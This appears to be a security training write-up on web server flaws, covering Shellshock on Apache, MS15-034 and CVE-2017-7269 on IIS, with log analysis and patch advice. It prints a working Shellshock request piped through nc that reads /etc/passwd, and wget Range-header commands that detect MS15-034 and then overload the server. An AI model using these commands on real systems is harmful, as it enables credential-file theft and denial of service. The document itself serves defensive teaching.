## Vulnerabilities on Servers

In this section, the vulnerabilities on the server itself will be reviewed. For further information on the vulnerabilities, you can visit the below site:

- http://www.cvedetails.com 

## Apache Web Server

The vulnerability with the code CVE-2014-6271, which is called "Shellshock" for the Apache web server and is used to run commands remotely, will be discussed. Systems using mod_cgi and mod_cgid modules on Apache servers are affected by the vulnerability and bash versions 1.14 to 4.3 are affected. The vulnerability can be exploited by modifying the HTTP_USER_AGENT environment variable to be malicious and targeting it to CGI scripts.

#### Attack Sample

For the sample attack to be carried out, the script runs on the target that pulls the "uptime" and "kernel" information from the server. With the following command, it is desired to read the "passwd" file of the destination address.

- `echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: TARGET_ADDRESS\r\nConnection: close\r\n\r\n" | nc TARGET_ADDRESS 80`

When the HTTP header of the response is examined, the content of the "passwd" file is displayed. The screenshot below shows that the user-agent header information has been changed and the request has been sent to the target.

![Image](/img/servervulns1.png)

#### Log Records

When the log records are examined, it is noteworthy that a HEAD request is sent to /cgi-bin/status.

![Image](/img/servervulns2.png)

At the same time, the /etc/passwd section, which is sent with various parameters, stands out. Network traffic is inspected to display the returned response.

The request sent to the “cgi-bin/status” file is given in the screenshot below.

![Image](/img/servervulns3.png)

Below is a screenshot of the response returned by the server to the requested request.

![Image](/img/servervulns4.png)

When the response is examined, it is seen that the server information has been disclosed.

#### Protection Methods

- Upgrade Bash to the current version.

The command to be used for this is; `sudo apt-get update && sudo apt-get install --only-upgrade bash` 

## Nginx Web Server

Looking at the security vulnerabilities found for the Nginx server, there is no critical vulnerability in 2010-2017

![Image](/img/servervulns5.png)

![Image](/img/servervulns7.png)

## IIS Web Server

In this section, two vulnerabilities will be mentioned. These are CVE-2017-7269 and MS15-034.

#### MS15-034 Vulnerability

This vulnerability allows remote code execution when a specially crafted HTTP request is sent to the windows system. Vulnerable versions: Machines with any version of IIS using HTTP.sys on Windows 7, Windows Server 2008 R2, Windows 8, Windows Server 2012, Windows 8.1, and Windows Server 2012 R2 operating systems. When the target is scanned with nmap, it is seen that it is using Windows Vista, 2000 or 7 and also IIS 7.5 is active.

![Image](/img/servervulns8.png)

![Image](/img/servervulns9.png)

In order to understand whether the related vulnerability is valid for the target, HTTP request with the "Range" header is sent to the target. The added range will be processed by the server. 

- `wget --header="Range: bytes=0-18446744073709551615" http://192.168.10.169/welcome.png`

The above command is entered and it is understood that the vulnerability exists due to the "416 Requested Range Not Satisfiable" output. Then it is sent again by changing the Range and is under overload.

- `wget --header="Range: bytes=18-18446744073709551615" http://192.168.10.169/welcome.png`

![Image](/img/servervulns10.png)

![Image](/img/servervulns11.png)

It is possible to get rid of the vulnerability associated with installing Windows updates.

## CVE-2017-7269 Vulnerability

CVE-2017-7269 vulnerability found on a machine running IIS 6.0 on Windows Server 2003 R2 will be discussed. The vulnerability is due to the buffer overflow attack of the ScStoragePathFromUrl function in the WebDAV service in IIS 6.0.

The vulnerability can be exploited by using the “iis_webdav_scstoragepathfromurl” exploit in Metasploit.

The screenshot of the settings made for the exploit is given below:

![Image](/img/servervulns12.png)

![Image](/img/servervulns13.png)

The screenshot of the meterpreter session obtained as a result of exploiting the vulnerability is given above.






























